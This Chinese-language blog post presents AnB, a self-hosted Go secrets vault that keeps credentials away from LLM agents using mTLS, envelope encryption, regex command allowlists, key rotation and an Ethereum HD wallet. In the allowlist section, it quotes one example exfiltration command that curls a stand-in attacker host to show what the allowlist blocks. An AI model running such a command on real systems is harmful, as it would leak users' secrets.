---
title: "Alice 和 Bob:为 AI Agent 时代设计的客户端/服务端密钥保险箱"
date: 2026-05-31T06:00:00+08:00
draft: false
tags: ["Security", "Secrets Management", "KMS", "AI Agent", "Go", "mTLS", "Cryptography", "BIP-39", "Ethereum", "Vault"]
categories: ["Tools", "Architecture"]
author: "Kaka"
description: "一个为 LLM Agent 而生的客户端/服务端密钥保险箱:Alice 客户端只见到密文,Bob 守护进程通过 mTLS 持有主密钥,密文永不离开 Bob 的内存。AES-256-GCM + Argon2id + 多版本 K + lazy rewrap + 自带 BIP-39 HD 钱包。"
---

## 引言:为什么 `.env` 文件不再够用

在 2026 年,一个 LLM Agent 已经可以读你的配置文件、决定要部署什么、然后替你跑 `kubectl apply`。你今天信任的那些凭据存储——`~/.aws/credentials`、`.env` 文件、裸环境变量、GUI 提示的密码管理器——都是**给人敲键盘点鼠标用的**。把键盘交给 Agent,三种失败模式立刻出现,而传统密钥库从来不是为了应对它们设计的:

| 失败模式 | 在典型密钥库下会发生什么 |
|---|---|
| **明文落盘** | `.env` / `~/.aws/credentials` / 嵌入 token 的 kubeconfig——任何能 `cat` 的 Agent 直接读 |
| **Stdout 外泄** | Agent 跑 `op read op://Vault/Item/password`(或同类命令),密钥被打到 Agent 的工具输出里,Agent 框架把这段输出当 context 流回 LLM 供应商的服务器 |
| **Argv 泄漏** | Agent 跑 `mycli --token sk-…`,token 出现在 `ps`、shell 历史、审计日志,以及任何同 uid 的兄弟进程的 `/proc/PID/cmdline` 里 |

这篇文章介绍我自己做的开源项目 [AnB(Alice and Bob)](https://github.com/kaka-milan-22/AnB):一个**客户端/服务端分离的密钥保险箱**,完全为 LLM Agent 时代设计。它是 [agent-vault](https://www.npmjs.com/package/@kaka-milan-22/agent-vault) (TypeScript) 的精神续集——同一套命令面 (`read`/`write`/`set`/`get`/`exec`)、同一套 `<agent-vault:key>` 占位符语法——但把主密钥从客户端**彻底搬走**,塞进一个独立的、走 mTLS 认证的 KMS 守护进程里。

它的设计目标只有一条:**Agent 永远不应该看到密钥明文**——无论是通过 stdout、argv、shell 历史、还是 Agent 框架的工具输出流。

---

## 整体架构:Alice 拿密文,Bob 拿钥匙

AnB 由两个 Go 二进制组成:

- **Alice**(客户端 CLI):你的 Agent 调用的工具。本地只存密文 + 元数据,运行 redaction 引擎,通过 mTLS 把单条密文交给 Bob 加解密。
- **Bob**(KMS 守护进程):持有主密钥(用 Argon2id 在磁盘上包裹,启动时由操作员用主密码解锁一次,然后驻留在 `mlock` 内存里,有可选的空闲 TTL)。Bob 只为通过认证 + 授权的客户端提供密码学操作。

```
                ┌──────────────────────────────────────────────────────────┐
                │  LLM Agent (Claude Code / Cursor / cron / 任意脚本)      │
                │      ↓  shell 调用: alice exec --env K=<placeholder> -- │
                └──────────────────────────────────────────────────────────┘
                                          │
   ┌──────────────────────────────────────┼──────────────────────────────────────┐
   │                          alice CLI — 四层安全栈                              │
   │                                                                              │
   │   1. TTY gate     敏感操作 (set/get --reveal/import) 非 TTY 拒绝             │
   │   2. allowlist    `alice exec` 只允许运行匹配正则规则的命令                  │
   │   3. redaction    `read` 把密钥换成占位符;`write` 把占位符换回密钥          │
   │   4. injection    密钥通过 syscall.Exec 注入子进程 env;不进 argv、         │
   │                   不进 alice 的 stdout、不进 Agent 的工具输出 context         │
   └──────────────────────────────────────────────────────────────────────────────┘
                                          │
                            mTLS (私有 CA,双向证书认证)
                                          │
                                          ▼
                          ┌──────────────────────────────┐
                          │  bob — KMS 守护进程            │
                          │  • 主密钥在 mlock 内存中       │
                          │  • Argon2id 在磁盘上包裹       │
                          │  • 按身份授权                  │
                          │  • JSON 审计日志               │
                          │  • 按身份限速                  │
                          └──────────────────────────────┘
                                          │
                                          ▼
                                   ┌─────────────┐
                                   │envelope.json│
                                   │  (已加密)    │
                                   └─────────────┘
```

主密钥**只**存在 Bob 的 mlock'd 内存里。它在磁盘上用 Argon2id 包裹,密码在 `bob serve` 启动时由操作员**敲入一次**,从不落盘。Alice 在 `vault.json` 里只持有单条密钥的密文(同样是 AES-256-GCM,由 Bob 加封,带版本号方便轮换)。整套设计是 AWS KMS / HashiCorp Vault Transit 的**信封加密**模式,缩到一对你完全控制的自托管二进制尺度。

---

## 关键设计选择

### 1. `alice exec` —— Agent 注入路径

Agent 在 AnB 上**唯一应该用**的写操作就是 `alice exec`。它的工作方式:

```sh
alice exec --env API_TOKEN='<agent-vault:my-api-token>' -- \
    curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com/me
```

这一行发生的事:

1. alice 解析 `--env API_TOKEN=<agent-vault:my-api-token>`——发现是占位符,去 Bob 那里把 `my-api-token` 解密。
2. alice 检查 `~/.anb/alice/exec-allowlist.rules`——`/usr/bin/curl -H "Authorization: Bearer ..." https://api.example.com/me` 这条命令必须匹配某条正则规则,且该规则允许注入 `API_TOKEN` 这个 env 名。
3. allowlist 通过后,alice 调用 `syscall.Exec(/usr/bin/curl, [...args], [API_TOKEN=明文, ...继承的环境])` —— 用 curl **替换掉**自己这个进程。

注意三个关键属性:

- **密钥不进 argv**:它只在 child 进程的 environ 里。`ps` 里看不到,shell 历史里看不到,`/proc/PID/cmdline` 里看不到(只看得到 `cmdline`,而 environ 在另一个文件里且默认 0600)。
- **密钥不进 alice 的 stdout**:alice 不打印任何明文。Agent 框架抓 alice 的 stdout 当作 tool output 也只能看到 `→ exec /usr/bin/curl with env=[API_TOKEN] rule=[my-curl-rule]` 这种审计行。
- **进程被替换不是 fork**:alice 不再活着监督子进程,父子关系**没有了**。子进程退出码直接当 alice 的退出码。

### 2. 正则白名单 —— 拒绝 Agent 跑任意命令

`exec-allowlist.rules` 是一个简单的纯文本文件,每行一条规则:

```
^/usr/bin/curl -H "Authorization: Bearer .+" https://api\.example\.com/me$	API_TOKEN	# api-example-readonly
```

格式三段,tab 分隔:**正则**(Go RE2,自动锚定 `^(?:…)$`,**没有 ReDoS 风险**)、**env 白名单**(逗号分隔的 env 变量名)、**审计标签**(`#` 开头,出现在 audit log 里)。

Alice 把 `shellescape(cmd) + " " + shellescape(arg1) + …` 拼成规范化字符串,逐行匹配。**第一条匹配的规则获胜**;`--env` 注入的变量名集合必须是该规则的子集;无匹配 = 硬性拒绝。

为什么是正则不是路径前缀?因为攻击者可能拿到 `/usr/bin/curl http://attacker.com/exfil`——同一个二进制,完全不同的语义。正则给操作员**逐 URL / 逐参数**控制的粒度。

`alice allowlist-check` 是配套的 lint 工具:它会拒绝匹配"一切"的规则(`.*`、`^.*$`),给过于宽松的模式发 WARN,给 `env=* + 宽松正则` 发 DANGER。

### 3. 多版本主密钥 + Lazy Rewrap —— 透明轮换

这是 AnB v2.6+ 的故事。**主密钥可以有多个版本**,vault.json 里每条密文都带一个 `v<N>:` 前缀标明它在哪个 K 下加密:

```
envelope.json (Bob 的磁盘状态)
{
  "version": 3,
  "keys": [
    { "id": 1, "created": "2026-04-01T...", "kdf": "argon2id", "wrapped": "..." },
    { "id": 2, "created": "2026-05-15T...", "kdf": "argon2id", "wrapped": "..." }
  ],
  "current": 2
}
```

轮换故事的三个命令:

| 命令 | 效果 |
|---|---|
| `bob rotate-master-password` | 默认行为:**改密码 + 加一个新 K**。`--keep-key` 退化为 v2.3 的纯密码轮换 |
| `bob rotate-master-key` | 加一个新 K,**不动密码**——纯密钥轮换 |
| `bob rotate-master-key --finalize <id>` | 彻底销毁 K_id,从 envelope.json 和 Bob 的 mlock 内存里抹掉 |

**Lazy rewrap 是默认行为**——你不用主动跑迁移命令。每一次普通的 `alice get` / `alice exec`,如果它读到的密文是旧版本 K 的,Bob 在解出明文的同时**顺手用 current K 重新加封一份**返回给 alice;alice 写回 vault.json。下次再读这条就是 current K 了。

操作员视角:

```sh
bob rotate-master-key                        # 加 K_2
alice rekey-status                           # 看进度:v1: 47 entries, v2: 0
# 让 Agent 正常工作几天 / 几周……
alice rekey-status                           # v1: 3 entries, v2: 44
# 等到 v1: 0
bob rotate-master-key --finalize 1           # 安全销毁 K_1
```

`alice rekey` 是"急性子"选项:**强制把所有非 current 条目立刻迁完**(等价于把 lazy rewrap 一次性催熟)。

为什么要这么折腾?**怀疑泄露走 --finalize**。如果某把旧 K 的材料可能进过别人的手(操作员离职、备份盘被借走、可疑 dump 文件出现),你需要一条**确定性的销毁路径**——而不是"等 GC 总会清掉的"。

### 4. 内置 BIP-39 HD 钱包

AnB v3.3+ 在 alice 里塞了一整套以太坊 HD 钱包。逻辑很简单:**助记词是一种秘密**,本来就该被 KMS 级托管。

```
助记词(24 词)
   │ BIP-39 PBKDF2-HMAC-SHA512(salt="mnemonic", 2048 轮)
   ↓
seed (64 B)
   │ BIP-32 master 派生
   ↓
master 私钥 (32 B + chain code)
   │ BIP-44 路径 m/44'/60'/0'/0/N
   ↓
child 私钥 (32 B)
   │ secp256k1 标量乘 G
   ↓
未压缩公钥 (64 B)
   │ keccak256,取最后 20 字节
   ↓
ETH 地址
   │ EIP-55 大小写校验
   ↓
0x9858EfFD232B4033E47d90003D41EC34EcaEda94
```

所有派生**完全确定性**——给定同一份助记词:

- `alice eth address --index 0` 永远算出同一个地址
- `alice eth address --index 5` 永远算出第 5 个不同的地址(都属于这同一份助记词)
- 你的硬盘 / vault.json 都被删了,只要还记得 24 词就能恢复**全部**地址 + 私钥

所以 vault.json 里**只存助记词**——任何 derived state 都不存。每次操作临时算一遍,几毫秒完成。

```sh
alice eth new                          # 生成 24 词 + 派生 /0 地址 + 落库
alice eth new --name eth-cold          # 第二个独立钱包(冷钱包)
alice eth address --name eth-cold --index 5
alice eth list                         # 列所有 ETH 钱包 + 地址
alice eth show --reveal-mnemonic       # TTY 上看 24 词(纸备份用)
```

故意**不**做的事:

- **不做签名**。AnB 守在托管层。要发交易,把助记词通过 `alice exec` 注入到 `cast` / `foundry` / 你自己的签名工具里:`alice exec --env ETH_MNEMONIC='<agent-vault:eth>' -- cast wallet sign-tx --mnemonic-env ETH_MNEMONIC …`。
- **不做非 EVM 链**。EVM 系(以太坊、Polygon、Arbitrum、Optimism、Base 共享同一地址空间)全部支持。比特币 / Solana 需要不同的曲线和地址编码,**out of scope**。

这条边界很重要——一旦给 alice 加了签名 + RPC + tx 广播,它就成了半成品 MetaMask,客户端可信代码量翻三倍,安全表面爆炸。AnB 做密钥托管,签名工具做签名,通过 env 注入连接,各司其职。

---

## 五分钟跑通

完整一遍 setup + 第一次使用:

```sh
# 1. 装两个二进制
go install github.com/kaka-milan-22/AnB/v3/cmd/alice@latest
go install github.com/kaka-milan-22/AnB/v3/cmd/bob@latest

# 2. 起 Bob (操作员一次性)
bob ca init                                 # 私有 CA
bob init --host localhost,127.0.0.1         # 包裹主密钥 + 服务器证书 (问主密码)
bob serve -D --addr 127.0.0.1:8443          # 守护进程化

# 3. 注册 Alice
alice enroll --bob 127.0.0.1:8443 \
             --ca ~/.anb/bob/ca.crt \
             --identity my-laptop           # 生成 keypair + CSR

# 4. Bob 签 CSR (操作员看到的)
bob sign-csr ~/.anb/alice/client.csr        # 屏幕上打 pairing code,Alice 那边输入确认

# 5. Alice 装回签好的证书
alice install-cert ~/.anb/bob/signed/my-laptop.crt
alice status                                # → Bob: unlocked  ✓

# 6. 存一个密钥
alice set my-api-token                       # TTY 提示输值

# 7. Agent 使用它(永远看不到明文)
alice exec --env API_TOKEN='<agent-vault:my-api-token>' -- \
    curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com
```

---

## 安全检查清单

把 AnB 投入生产前跑一遍这几条:

```sh
# (1) vault.json 只是密文
cat ~/.anb/alice/vault.json | jq '.secrets | map(.value) | .[0]'
# → "v3:8c4f...:..." (十六进制密文,没有明文)

# (2) `alice exec` 之后 ps 看不到密钥
alice exec --env TOK='<agent-vault:my-api-token>' -- sleep 30 &
ps aux | grep sleep
# → "/bin/sleep 30" — TOK 在 child 的 environ 里,不在 argv

# (3) Bob 的审计日志记录每次解密
tail -5 ~/.anb/bob/bob.log | jq .
# → JSON 行,带 identity / op / keys / reason

# (4) 主密钥从未在 alice 端
ls -la ~/.anb/alice/
# → vault.json、client.key (0600)、client.crt、ca.crt、config.json、exec-allowlist.rules
# → 没有 master.key,没有 envelope.json,这俩只在 ~/.anb/bob/

# (5) Bob 的主密钥是 mlock 的
ps -o rss,command $(cat ~/.anb/bob/bob.pid)
# → RSS 里包含主密钥页,但页面 mlock 了 (内存压力下不会换出到磁盘)

# (6) 白名单拒绝未知命令(Agent 非 TTY 调用)
alice exec --env API_TOKEN='<agent-vault:my-api-token>' -- /bin/cat /etc/hosts
# → ✗ DENIED  (假设 /bin/cat 不在你的 allowlist 里)
```

---

## 审计日志 + Agent 调用矩阵

`~/.anb/bob/bob.log` 是每事件一行 JSON。看个真实例子:

```json
{"ts":"2026-05-31T00:42:01.234Z","kind":"ALLOW","identity":"my-laptop","op":"decrypt","keys":["my-api-token"],"reason":"deploy v1.2"}
{"ts":"2026-05-31T00:42:01.456Z","kind":"DENY","identity":"agent-ci","op":"decrypt","key":"prod-master-password","cause":"unauthorized"}
{"ts":"2026-05-31T00:42:05.789Z","kind":"RATELIMIT","identity":"agent-ci","op":"decrypt","cause":"limit-exceeded"}
```

事件类型覆盖 `ALLOW` / `DENY` / `RATELIMIT` / `KEY_REWRAP` / `KEY_ADDED` / `KEY_FINALIZED` / `HANDSHAKE_FAIL` / `AUTOLOCK` 等。jq 即可分析:

```sh
# 最近一小时所有拒绝
jq -c 'select(.kind == "DENY" and (.ts | fromdateiso8601) > (now - 3600))' ~/.anb/bob/bob.log

# 被访问最多的 10 个 key
jq -r 'select(.kind=="ALLOW") | .keys[]' ~/.anb/bob/bob.log | sort | uniq -c | sort -rn | head

# 今天 agent-ci 读过哪些密钥
jq -c 'select(.identity=="agent-ci" and .op=="decrypt")' ~/.anb/bob/bob.log
```

Agent 能做什么、不能做什么的矩阵:

| 操作 | Agent(非 TTY)| 人(TTY)|
|---|---|---|
| `list` / `has` / `status` | ✓ | ✓ |
| `read` / `scan`(redacted 输出)| ✓ | ✓ |
| `exec`(占位符解析 + env 注入)| ✓ 若匹配白名单规则 | ✓ + 未匹配时交互确认 |
| `write` / `template`(占位符还原)| ✓ | ✓ |
| `shell`(交互式子 shell)| 拒绝 — TTY only | ✓ |
| `set` / `import` / `rm`(改 vault)| 拒绝 — TTY only | ✓ |
| `get` / `eth show`(元数据)| ✓ | ✓ |
| `get --reveal` / `eth show --reveal-mnemonic`(明文)| 拒绝 — stdout-TTY only | ✓ |
| `eth new` / `eth import`(创建钱包)| 拒绝 — TTY only | ✓ |
| `gen`(密码生成器)| ✓(v3.2+ 管道友好)| ✓ |

---

## 还在路上 / 已知边界

AnB 当前是 v3.3.2。继续在做的:

- **`alice audit --tail`**:把 Bob 的 JSON audit log 通过 mTLS 流到 alice 端。Bob 远程时刚需。
- **证书过期预警**:`alice status` / `bob serve` 在客户端/服务器证书 <30 天到期时报警。三行 if。
- **PKCS#11 客户端密钥后端**:让 alice 的私钥存在硬件 token(Yubikey / Nitrokey / SoloKey)里,文件级攻击者无法冒充身份。

明确**不做**的:

- **多机器密钥同步**——AnB 是一对自托管二进制,不是云服务。你想 N 台机器共享密钥,选 1Password 或 Vault。
- **GUI / 浏览器自动填充**——非目标。继续用 Apple Passwords 处理浏览器密码。
- **签名 / 链上交互**(对 eth 钱包来说)——AnB 守在密钥托管层,签名委托给 `cast` / `foundry` 这类专门工具,通过 `alice exec` 连接。

---

## 总结

AnB 试图回答一个具体问题:**当你信任的不是某个程序员,而是一个会幻觉的语言模型时,密钥应该怎么放?**

答案不是某种全新的密码学——AnB 用的就是大家熟悉的 AES-256-GCM、Argon2id、mTLS、BIP-39/44。答案在**架构边界**:

- 主密钥从客户端**搬走**,放进一个独立的、走 mTLS 认证的守护进程。Alice 永远只看到密文。
- 注入路径用 `syscall.Exec` 把密钥**塞进子进程的 environ**,而不是放进 argv 或 stdout。Agent 框架的 tool output 不会看到明文。
- 用**正则白名单**而不是路径前缀决定哪些命令能跑——把"逐 URL 控制"的粒度留给操作员。
- **多版本主密钥 + lazy rewrap** 让轮换变成日常操作,而不是季度大事件。
- **内置 HD 钱包**——把助记词当成"另一种秘密"放进同一套托管,而不是另外造一个钱包应用。

整个项目是 Go,~7000 行代码,MIT 协议,源码在 [github.com/kaka-milan-22/AnB](https://github.com/kaka-milan-22/AnB)。如果你也在被"Agent 怎么安全地接触密钥"这个问题折腾,欢迎 issue / PR。

## 参考资料

- AnB 项目:[github.com/kaka-milan-22/AnB](https://github.com/kaka-milan-22/AnB)
- agent-vault(前身,已被 AnB 替代):[npmjs.com/package/@kaka-milan-22/agent-vault](https://www.npmjs.com/package/@kaka-milan-22/agent-vault)
- wallet(在 AnB 之上构建的 EVM Agent 钱包):[github.com/kaka-milan-22/wallet](https://github.com/kaka-milan-22/wallet)
- BIP-39 / BIP-32 / BIP-44 规范:[bitcoin/bips](https://github.com/bitcoin/bips)
- EIP-55(以太坊地址校验):[ethereum/EIPs](https://eips.ethereum.org/EIPS/eip-55)
- AWS KMS 信封加密文档(同构模式):[docs.aws.amazon.com/kms/latest/developerguide/concepts.html](https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html)
